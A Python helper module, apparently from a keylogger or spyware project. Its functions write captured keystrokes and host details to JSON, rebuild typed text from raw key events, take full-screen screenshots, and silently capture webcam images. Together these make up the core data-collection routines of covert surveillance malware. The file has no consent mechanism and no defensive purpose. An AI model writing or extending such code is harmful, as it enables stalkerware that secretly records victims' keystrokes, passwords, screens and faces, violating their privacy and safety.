import json
import os
import sys
import uuid

import cv2
import pyscreenshot as image_grab

from classes import Host


def get_file_size(file_name):
    return os.path.getsize(file_name) / 1000000.0


def get_object_size(obj):
    return sys.getsizeof(obj) / 1000000.0


def write_keys_to_file(keys: dict, file_name: str, host: Host):
    with open(file_name, "w") as file:
        dict_to_write = {
            "host": host.to_json(),
            "keys": keys
        }
        json.dump(dict_to_write, file)


# TODO: Improve
def convert_to_legible_text(keys: dict):
    text = ""
    for value in keys.values():
        if value == "Key.enter":
            text += "\n"
        elif value == "Key.space":
            text += " "
        elif value == "Key.backspace":
            text = text[:-1]
        elif "Key" in value:
            text += "\n" + value + "\n"
        else:
            text += value
    return ' '.join(text.split())


def write_legible_text_to_file(keys: dict, file_name: str):
    text = convert_to_legible_text(keys)
    with open(file_name, "w") as file:
        file.write(text)


def take_screenshot():
    file_name = str(uuid.uuid4()) + '.png'
    try:
        screenshot = image_grab.grab()
        filepath = file_name
        screenshot.save(filepath)
        return filepath
    except Exception as e:
        print(e)
        print("Error taking screenshot")
        return None


def take_picture_from_webcam():
    file_name = str(uuid.uuid4()) + '.png'
    try:
        webcam = cv2.VideoCapture(0)
        check, frame = webcam.read()
        filepath = file_name
        cv2.imwrite(filepath, frame)
        webcam.release()
        return filepath
    except Exception as e:
        print(e)
        print("Error taking picture from webcam")
        return None
